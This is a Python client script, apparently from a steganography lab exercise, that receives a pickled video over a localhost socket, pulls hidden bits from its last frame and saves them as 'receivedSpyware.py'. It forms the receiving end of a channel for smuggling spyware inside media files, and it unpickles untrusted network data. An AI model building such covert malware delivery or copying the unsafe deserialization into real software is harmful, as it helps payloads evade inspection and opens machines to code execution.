import socket
import pickle
import stegnography as steg
import sys
import os
import cv2

ip = '127.0.0.1'
port = 12345

if(len(sys.argv) != 2):
	print("Usage : python3 t6_client.py <client_name>")
	exit()


client = sys.argv[1]

if not os.path.exists(client):
	os.makedirs(client)

b = steg.generate_binary_of_spyware()
length = len(b)
os.chdir(client)

s = socket.socket()
s.connect((ip,port))

# #FOR IMAGE
# image_fragments = b''
# while(1):
# 	chunk = s.recv(1024)
# 	if not chunk:
# 		break
# 	image_fragments += chunk

# image = pickle.loads(image_fragments)
# print("Image file received...")

# f = open('imgWithSpyware.png', 'wb')
# f.write(image)
# f.close()

# img = cv2.imread('imgWithSpyware.png')
# bits = steg.extract_from_image(img, length)
# # print(len(bits))
# steg.store_in_file('receivedSpyware.py', bits)


# #FOR VIDEO
video_fragments = b''
while(1):
	chunk = s.recv(1024 * 50)
	if not chunk:
		break
	video_fragments += chunk

video = pickle.loads(video_fragments)
print("Video file received...")

f = open('videoWithSpyware.avi', 'wb')
f.write(video)
f.close()

cap = cv2.VideoCapture('videoWithSpyware.avi')
i=0
frames = []
while(cap.isOpened()):
	ret, frame = cap.read()
	if ret == False:
		break
	frames.append(frame)
	i+=1

cap.release()

bits = steg.extract_from_video(frames[-1], length)
# print(len(bits))
steg.store_in_file('receivedSpyware.py', bits)

s.close()
